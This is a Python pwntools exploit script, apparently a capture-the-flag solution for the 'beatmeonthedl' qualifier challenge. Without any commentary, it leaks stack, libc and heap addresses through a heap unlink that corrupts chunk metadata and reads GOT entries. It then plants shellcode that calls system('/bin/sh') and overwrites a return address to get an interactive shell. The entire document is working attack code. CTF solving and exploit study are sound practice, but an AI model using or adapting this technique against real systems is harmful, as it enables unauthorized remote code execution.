from pwn import *

s = remote('beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me',6969)

reqlist = 0x609e80
atoigot = 0x6099d8
putgot = 0x609958

def req(txt):
	sleep(0.1)
	s.sendline('1')
	s.recvuntil('text >')
	s.sendline(txt)

def chreq(num,txt):
	sleep(0.1)
	s.sendline('4')
	s.recvuntil(': ')
	s.sendline(num)
	s.recvuntil(': ')
	s.send(txt)

def delreq(num):
	sleep(0.1)
	s.sendline('3')
	s.recvuntil(': ')
	s.sendline(num)

def printreq():
	sleep(0.1)
	s.sendline('2')

# STACK LEAK
s.recvuntil(': ')
s.sendline('A' * 16) # 16byte
ret_leak = u64(s.recvuntil('Enter username:')[30:36] + "\x00" * 2) + 0x28
print "[+] RET ADD : " + hex(ret_leak)

# LOGIN
s.recv(1024)
s.send('mcfly') # 16byte
s.recvuntil(': ')
s.sendline('awesnap') # 24byte + malloc(24)

# LIBC LEAK
req('AAAA')
req('BBBB')
fake_chunk1 = 'A' * 48 + "\x00" * 8 + p64(0x42) + p64(0x609e80-8) + p64(atoigot)
chreq('0',fake_chunk1)
delreq('1')
printreq()
s.recvuntil('2) ')
atoi_add =  u64(s.recv(6) + "\x00" * 2)
print "[+] ATOI ADD : " + hex(atoi_add)

req('AAAA')
fake_chunk1 = 'A' * 48 + "\x00" * 8 + p64(0x42) + p64(0x609e80-8) + p64(putgot)
chreq('0',fake_chunk1)
delreq('1')
printreq()
s.recvuntil('2) ')
print "[+] PUTS ADD : " + hex(u64(s.recv(6) + "\x00" * 2))
system = atoi_add + 0xc6f0
binsh = atoi_add + 0x142d8b
print "[+] LIBC is libc-2.19_15.so"
print "[+] SYSTEM ADD : " + hex(system)
print "[+] /BIN/SH ADD : " + hex(binsh)

# HEAP LEAK
req('AAAA')
req('AAAA')
req('AAAA')
req('AAAA')
fake_chunk1 = 'A' * 48 + "\x00" * 8 + p64(0x42) + p64(0x609e80) + p64(0x609e88)
chreq('0',fake_chunk1)
delreq('1')
printreq()
s.recvuntil('3) ')
heap_leak = u64(s.recv(4) + "\x00" * 4)
print "[+] HEAP ADD : " + hex(heap_leak)
delreq('0')
delreq('1')
delreq('3')

# EXPLOIT
req('AAAA')
req('AAAA')
shellcode = asm('mov rax, ' + str(system), arch = 'amd64', os = 'linux')
shellcode += asm('mov rdi, ' + str(binsh), arch = 'amd64', os = 'linux')
shellcode += asm('call rax', arch = 'amd64', os = 'linux')

fake_chunk2 = shellcode + '\x00' * (48 - len(shellcode))
fake_chunk2 += "\x00" * 8 + p64(0x42) + p64(heap_leak) + p64(ret_leak-16)

chreq('0',fake_chunk2)
print "[+] SENT SHELLCODE"
delreq('1')
sleep(1)
s.sendline('5')
s.recvuntil('ng--')
print "[+] GOT SHELL!"
s.interactive()
